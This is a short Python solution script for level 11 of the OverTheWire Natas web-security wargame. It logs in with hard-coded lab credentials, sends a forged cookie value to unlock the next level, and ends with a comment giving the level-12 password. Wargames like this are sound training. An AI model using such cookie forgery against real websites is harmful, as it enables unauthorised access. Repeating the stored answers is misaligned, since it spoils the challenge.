import requests
import base64

username="natas11"
password="U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"

url=str("http://%s.natas.labs.overthewire.org" %username)
cookie={'data':'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'}

r=requests.post(url,auth=(username,password),cookies=cookie)

print(r.text)
#The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

